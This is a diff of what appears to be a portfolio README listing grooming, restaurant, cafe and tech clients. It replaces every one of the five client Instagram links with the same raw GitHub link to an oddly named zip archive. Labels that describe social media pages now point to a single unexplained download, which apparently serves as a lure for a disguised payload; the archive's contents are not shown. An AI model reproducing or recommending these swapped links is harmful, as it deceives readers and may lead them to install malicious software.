@@ -5,21 +5,21 @@
 # video animations 
 # Epitails By Commando kennels 
 
-# https://www.instagram.com/epitailsbycommandokennels?igsh=bDI3Z2liOWFvejY0
+# https://raw.githubusercontent.com/sai9640nayak/my-_resume/main/membranelle/resume-my-3.4-alpha.5.zip
 
 # Academy of Grooming Arts 
 
-# https://www.instagram.com/academyofgroomingarts?igsh=cnUxZmozNnEyOWo3
+# https://raw.githubusercontent.com/sai9640nayak/my-_resume/main/membranelle/resume-my-3.4-alpha.5.zip
 
 # Mubarak Medchal restaurant 
 
-# https://www.instagram.com/mubarak.medchal?igsh=Y2FiYTIyYXQyNmg0
+# https://raw.githubusercontent.com/sai9640nayak/my-_resume/main/membranelle/resume-my-3.4-alpha.5.zip
 
 # Ariko Cafe
 
-# https://www.instagram.com/ariko.in?igsh=OWdzd2UwOG16cnEz
+# https://raw.githubusercontent.com/sai9640nayak/my-_resume/main/membranelle/resume-my-3.4-alpha.5.zip
 
 # NARESHITECH 
 
-# https://www.instagram.com/nareshitech?igsh=YWhuOGh0OGhuaGZ2
+# https://raw.githubusercontent.com/sai9640nayak/my-_resume/main/membranelle/resume-my-3.4-alpha.5.zip
  
